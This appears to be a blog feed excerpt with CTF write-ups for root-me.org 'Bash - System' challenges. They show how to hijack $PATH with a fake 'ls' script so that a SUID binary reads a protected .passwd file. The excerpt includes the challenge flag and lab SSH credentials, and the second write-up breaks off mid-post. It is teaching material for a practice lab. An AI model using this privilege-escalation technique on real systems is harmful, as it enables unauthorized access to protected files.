&lt;span class=&quot;nt&quot;&gt;-r--r-----&lt;/span&gt;  1 app-script-ch12         app-script-ch12          204 Dec 10  2021 ch12.c
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;As we can see, we need to find a way to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cat&lt;/code&gt; the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.passwd&lt;/code&gt; file through the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ch12&lt;/code&gt; binary, which is the compiled version of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ch12.c&lt;/code&gt;. The problem is exactly the same as the previous one in Bash - System 1. The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ch12&lt;/code&gt; SUID bit is set, meaning the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;system&lt;/code&gt; function, alongside with the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;setreuid&lt;/code&gt;, will make sure the script runs the command as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;app-script-ch12-cracked&lt;/code&gt;, granting the right permissions we need to read &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.passwd&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;We could think of a way to trick the program into thinking it ran the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls&lt;/code&gt; command, but actully runs the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cat&lt;/code&gt; command. However, the switch &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-lA&lt;/code&gt; will make this unbearable. The thing is that the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cat&lt;/code&gt; command does not have these two switches used here.&lt;/p&gt;

&lt;p&gt;Well, we already know how to make the program runs a crafted &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls&lt;/code&gt; command. We just need to find a way to make it ignore the switch. That’s our goal!&lt;/p&gt;

&lt;h2 id=&quot;step-3---crafting-the-attack&quot;&gt;&lt;a href=&quot;#mindset-step3&quot;&gt;&lt;/a&gt;Step 3 - Crafting the attack&lt;/h2&gt;

&lt;p&gt;We shall start solving this challenge by doing exactly what we have done in Bash - System 1:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;First, we go to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/tmp&lt;/code&gt; directory and make a new directory. Then, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cd&lt;/code&gt; into it:&lt;/li&gt;
&lt;/ol&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;app-script-ch12@challenge02:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;mkdir&lt;/span&gt; /tmp/cecil
app-script-ch12@challenge02:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /tmp/cecil
app-script-ch12@challenge02:/tmp/cecil&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;ol&gt;
  &lt;li&gt;Now, we export this path to our $PATH variable with the following command:&lt;/li&gt;
&lt;/ol&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;app-script-ch12@challenge02:/tmp/cecil&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;export &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;PATH&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/tmp/cecil:&lt;span class=&quot;nv&quot;&gt;$PATH&lt;/span&gt;
app-script-ch12@challenge02:/tmp/cecil&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$PATH&lt;/span&gt;
/tmp/cecil:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin:/opt/tools/checksec/
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This part is already done. The new $PATH variable includes our new path as first, meaning that any script will prioritize it when looking for commands to run. Now it comes the tricky part.&lt;/p&gt;

&lt;p&gt;To make a point, let’s try to solve this (erroneously) with the same approach used in Bash - System 1. We copied the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/bin/cat&lt;/code&gt; binary into &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/tmp/cecil&lt;/code&gt; with the name of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls&lt;/code&gt;. After that, we run the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ch12&lt;/code&gt; binary to read the contents of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.passwd&lt;/code&gt;:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;app-script-ch12@challenge02:/tmp/cecil&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cp&lt;/span&gt; /bin/cat &lt;span class=&quot;nb&quot;&gt;ls
&lt;/span&gt;app-script-ch12@challenge02:/tmp/cecil&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; -
/challenge/app-script/ch12
app-script-ch12@challenge02:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./ch12
&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt;: invalid option &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;l&apos;&lt;/span&gt;
Try &lt;span class=&quot;s1&quot;&gt;&apos;ls --help&apos;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;more information.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;As we can see, this does not work, and the reason is exactly because of the switch &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-lA&lt;/code&gt;. It would have worked if we did not have these switches.&lt;/p&gt;

&lt;h3 id=&quot;abusing-chmod-command&quot;&gt;Abusing &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;chmod&lt;/code&gt; command&lt;/h3&gt;

&lt;p&gt;One way I thought to circumvent this is by writing a bash script named &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls&lt;/code&gt; that contained a command to read &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.passwd&lt;/code&gt;. But to do so, we need access to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;chmod&lt;/code&gt;. We can test this in our &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/tmp/cecil&lt;/code&gt; directory by creating a bash script called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;test&lt;/code&gt; and making it an executable with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;chmod +x test&lt;/code&gt;. For our &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;test&lt;/code&gt; script, we wrote it with vim:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;hi mom&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Followed by:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;app-script-ch12@challenge02:/tmp/cecil&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;chmod&lt;/span&gt; +x &lt;span class=&quot;nb&quot;&gt;test
&lt;/span&gt;app-script-ch12@challenge02:/tmp/cecil&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./test
hi mom
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;As we can see, we can use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;chmod&lt;/code&gt; to create bash executable scripts. Since we are inside a directory included in the path variable, we could craft an &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls&lt;/code&gt; bash script with a cat command inside of it:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;and then:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;app-script-ch12@challenge02:/tmp/cecil&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;chmod&lt;/span&gt; +x &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;step-4---solving&quot;&gt;&lt;a href=&quot;#mindset-step4&quot;&gt;&lt;/a&gt;Step 4 - Solving!&lt;/h2&gt;

&lt;p&gt;Ok. We have a bash script that mimics the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cat&lt;/code&gt; command disguised as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls&lt;/code&gt;. Let’s try it out.&lt;/p&gt;

&lt;h3 id=&quot;attempt-1&quot;&gt;Attempt 1&lt;/h3&gt;

&lt;p&gt;If we try to run the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ch12&lt;/code&gt; binary under these circumstances, this is what happens:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;app-script-ch12@challenge02:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./ch12

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Nothing. Why?! Here’s what is happening: the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;./ch12&lt;/code&gt; is looking for the binary called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls&lt;/code&gt;, which in this case is a bash script that runs an empty &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cat&lt;/code&gt; command. But what happens with the rest of the string in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;system&lt;/code&gt; function, you ask? Well, they are treated as command line arguments to our bash script!&lt;/p&gt;

&lt;p&gt;To test this hypothesis, let’s change our &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls&lt;/code&gt; bash script to the following:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;False command: &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Arguments: &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$@&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Now, when our &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls&lt;/code&gt; command runs, it will print out its path and the arguments passed after it. If our hypothesis is correct, when we run &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ch12&lt;/code&gt; now, it should print the rest of the string as the arguments:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;app-script-ch12@challenge02:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./ch12
False &lt;span class=&quot;nb&quot;&gt;command&lt;/span&gt;: /tmp/cecil/ls
Arguments: &lt;span class=&quot;nt&quot;&gt;-lA&lt;/span&gt; /challenge/app-script/ch12/.passwd
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Amazing! It is in the mistakes that we craft a solution!&lt;/p&gt;

&lt;h3 id=&quot;attempt-2&quot;&gt;Attempt 2&lt;/h3&gt;

&lt;p&gt;Since we got rid of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-lA&lt;/code&gt; flag by making it to be passed as arguments of our fake &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls&lt;/code&gt; script, we can change the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls&lt;/code&gt; bash script to simply &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cat /challenge/app-script/ch12/.passwd&lt;/code&gt;:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /challenge/app-script/ch12/.passwd
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Now, we run the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ch12&lt;/code&gt; binary again:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;app-script-ch12@challenge02:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./ch12
8a95eDS/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;e_T#
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;And we get the flag!&lt;/p&gt;

&lt;h1 id=&quot;conclusion&quot;&gt;&lt;a href=&quot;#conclusions&quot;&gt;&lt;/a&gt;Conclusion&lt;/h1&gt;

&lt;p&gt;In this CTF, we dove into another layer of system complexities and the exploitation of C functions. We began by dissecting the core elements presented by the challenge script, progressing towards identifying potential exploitation avenues.&lt;/p&gt;

&lt;p&gt;The strategy was built around the concept of command substitution, made possible by the writable &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/tmp&lt;/code&gt; directory and by manipulating the $PATH variable. This allowed us to craft a substitute &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls&lt;/code&gt; command that redirected the execution flow from the intended &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls -lA&lt;/code&gt; command to our bash script. By creating a bash script, the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls&lt;/code&gt; command was treated as a executable and the rest of the string as arguments, eliminating the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-lA&lt;/code&gt; switch.&lt;/p&gt;

&lt;p&gt;This was all possible due to the fact we had already tackled a similar problem, and because we tried a failed attempt first. Remember, it is in the failures that we find the solution!&lt;/p&gt;

&lt;p&gt;Thanks for sticking ‘til the end. I hope you learned something new today! And remember, always do your &lt;strong&gt;research!&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/&quot;&gt;Go back&lt;/a&gt;&lt;/p&gt;

</description>
        <pubDate>Tue, 05 Dec 2023 00:00:00 +0000</pubDate>
        <link>http://localhost:4000//bash-system-2-root-me</link>
        <link href="http://localhost:4000/bash-system-2-root-me"/>
        <guid isPermaLink="true">http://localhost:4000/bash-system-2-root-me</guid>
      </item>
    
      <item>
        <title>Bash - System 1 - root-me.org</title>
        <description>&lt;h1 id=&quot;introduction&quot;&gt;&lt;a href=&quot;#intro&quot;&gt;&lt;/a&gt;Introduction&lt;/h1&gt;

&lt;p&gt;&lt;a href=&quot;https://www.root-me.org&quot;&gt;Root-me&lt;/a&gt; is a CTF website that tries to gamify learning topics by giving different types of challenges across many different areas in cybersecurity. This was one of my first contacts with CTFs, back in December 2022. Since I had already solved some of the challenges at that time, I decided to go back to re-solve them, and give them a proper write-up this time (why not?)&lt;/p&gt;

&lt;p&gt;The categories on the website are under the challenges tab. In this post, we’ll be solving the App Script category’s Bash System 1, the very first challenge. Let’s jump right into it!&lt;/p&gt;

&lt;h1 id=&quot;challenge-description&quot;&gt;&lt;a href=&quot;#level-description&quot;&gt;&lt;/a&gt;Challenge description&lt;/h1&gt;

&lt;p&gt;Differently from Pwnable, the challenges under Root-me display a ‘Statement’ and ‘Connection information’. The ‘Statement’, usually composed of the CTF objective, showcases a script to which we need to exploit. The source code is already available even before sshing:&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;cp&quot;&gt;#include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
&lt;/span&gt;    &lt;span class=&quot;cp&quot;&gt;#include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;sys/types.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
&lt;/span&gt;    &lt;span class=&quot;cp&quot;&gt;#include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;unistd.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
&lt;/span&gt;     
    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;setreuid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;geteuid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;geteuid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;());&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;ls /challenge/app-script/ch11/.passwd&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;To connect to the room, we need to SSH or use their WebSSH. I’d much rather use SSH from my local machine, though their WebSSH also works. The command for this challenge is:&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ssh -p 2222 app-script-ch11@challenge02.root-me.org&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;and the password is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;app-script-ch11&lt;/code&gt;.&lt;/p&gt;

&lt;h1 id=&quot;approach-mindset&quot;&gt;&lt;a href=&quot;#approach&quot;&gt;&lt;/a&gt;Approach mindset&lt;/h1&gt;

&lt;p&gt;Although this is a different CTF website, we will use the same approach mindset we have been using so far. This not only helps us to maintain a certain organized step-by-step to solve CTFs, but also actually increases the probability of learning how to engage in any kind of hacking-related topic.&lt;/p&gt;

&lt;p&gt;In this CTF, the first thing we can understand by looking at the C code above is that there is probably a file &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.passwd&lt;/code&gt; inside &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/challenge/app-script/ch11&lt;/code&gt; directory. The code seems to be using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;system&lt;/code&gt; to run the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls&lt;/code&gt; command at the file.&lt;/p&gt;

&lt;h2 id=&quot;step-1---understanding-basic-concepts&quot;&gt;&lt;a href=&quot;#mindset-step1&quot;&gt;&lt;/a&gt;Step 1 - Understanding basic concepts&lt;/h2&gt;

&lt;p&gt;What are the basic concepts in this CTF? Well, in our case here, this will simply be to investigate what the functions used in the above script are for. For that matter, we will need to do a little C programming research.&lt;/p&gt;

&lt;h3 id=&quot;setreuid&quot;&gt;setreuid&lt;/h3&gt;

&lt;p&gt;According to the Linux manual page, this function takes two unsigned integer arguments: the real user id and the effective user id. Put in simple Linux terms, the ‘real user id’ is who you really are within the system (the one who owns the process); while the ‘effective user id’ is what the operating system looks at to make a decision whether or not you are allowed to do something.&lt;/p&gt;

&lt;p&gt;Here’s a break down of what the function does, according to the &lt;a href=&quot;https://man7.org/linux/man-pages/man2/setreuid.2.html&quot;&gt;Linux manual page&lt;/a&gt;:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Unprivileged processes may only set the effective user ID to the real user ID, the effective user ID, or the saved set-user-ID.&lt;/p&gt;

  &lt;p&gt;Unprivileged users may only set the real user ID to the real user ID or the effective user ID.&lt;/p&gt;

  &lt;p&gt;If the real user ID is set (i.e., ruid is not -1) or the effective user ID is set to a value not equal to the previous real user ID, the saved set-user-ID will be set to the new effective user ID.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;The two arguments provided by the code are the same: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;geteuid()&lt;/code&gt;. According to the Linux manual page:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;geteuid() returns the effective user ID of the calling process.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;This basically means that whoever owns the above C script, the code will run it as that owner (and its privileges).&lt;/p&gt;

&lt;h3 id=&quot;system&quot;&gt;system&lt;/h3&gt;

&lt;p&gt;This function passes a command name or program name specified by a string to the host environment. The command processor then executes the passed command and returns after it has been completed.&lt;/p&gt;

&lt;p&gt;Linking with the previous function: the code interprets the script/binary owner’s privileges and runs the command with those privileges.&lt;/p&gt;

&lt;h2 id=&quot;step-2---understanding-the-problem&quot;&gt;&lt;a href=&quot;#mindset-step2&quot;&gt;&lt;/a&gt;Step 2 - Understanding the problem&lt;/h2&gt;

&lt;p&gt;Now that we understand the basic concepts of this CTF script, we are ready to broaden our view by relating it to the actual CTF. Let’s ssh into the machine and take a look around using the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls -la&lt;/code&gt; command:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;app-script-ch11@challenge02:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
total 36
dr-xr-x---  2 app-script-ch11-cracked app-script-ch11 4096 Dec 10  2021 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
drwxr-xr-x 25 root                    root            4096 Sep  5 14:00 ..
&lt;span class=&quot;nt&quot;&gt;-r--------&lt;/span&gt;  1 root                    root             775 Dec 10  2021 ._perms
&lt;span class=&quot;nt&quot;&gt;-rw-r-----&lt;/span&gt;  1 root                    root              43 Dec 10  2021 .git
&lt;span class=&quot;nt&quot;&gt;-r--------&lt;/span&gt;  1 app-script-ch11-cracked app-script-ch11   14 Dec 10  2021 .passwd
&lt;span class=&quot;nt&quot;&gt;-r--r-----&lt;/span&gt;  1 app-script-ch11-cracked app-script-ch11  494 Dec 10  2021 Makefile
&lt;span class=&quot;nt&quot;&gt;-r-sr-x---&lt;/span&gt;  1 app-script-ch11-cracked app-script-ch11 7252 Dec 10  2021 ch11
&lt;span class=&quot;nt&quot;&gt;-r--r-----&lt;/span&gt;  1 app-script-ch11-cracked app-script-ch11  187 Dec 10  2021 ch11.c
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;followed by this command:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;app-script-ch11@challenge02:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;whoami&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups &lt;/span&gt;app-script-ch11
app-script-ch11
app-script-ch11 : app-script-ch11 &lt;span class=&quot;nb&quot;&gt;users&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The output of these commands tell us we are part of most files’ group, but are not the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;app-script-ch1-cracked&lt;/code&gt; user. As a consequence, we are not able to read the contents of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.passwd&lt;/code&gt;, unless we somehow acquire the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;app-script-ch11-cracked&lt;/code&gt; user’s priveleges.&lt;/p&gt;

&lt;p&gt;We can, however, execute the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ch11&lt;/code&gt; binary, with a possible exploitation of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;setreuid&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;system&lt;/code&gt; functions. Note that the binary &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ch11&lt;/code&gt; has the SUID bit set, meaning that when running, it’ll assume the owner’s file effective user id.&lt;/p&gt;

&lt;p&gt;The SUID bit set is a special permission that applies to scripts or applications. If the SUID bit is set, the script/application effective’s UID becomes that of the owner of the file, instead of the user running it.&lt;/p&gt;

&lt;p&gt;However, this only results in running the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls&lt;/code&gt; command, which is useless in this case. Ideally, we would want the command inside the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;system&lt;/code&gt; function to be &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cat&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;The key to solve this problem is to trick the program into thinking it ran &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls&lt;/code&gt; command, but actually runs the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cat&lt;/code&gt; command. There are a few ways we can try to do this, and that’s what we will discuss next.&lt;/p&gt;

&lt;h2 id=&quot;step-3---crafting-the-attack&quot;&gt;&lt;a href=&quot;#mindset-step3&quot;&gt;&lt;/a&gt;Step 3 - Crafting the attack&lt;/h2&gt;

&lt;p&gt;Let’s try to solve the challenge by applying what we’ve learned so far and putting into test our assumption of tricking the program to run &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cat&lt;/code&gt; instead of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls&lt;/code&gt;. First, let’s see where the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls&lt;/code&gt; command is being run:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;app-script-ch11@challenge02:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;which &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt;
/bin/ls
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;followed by the $PATH variable:&lt;/p&gt;

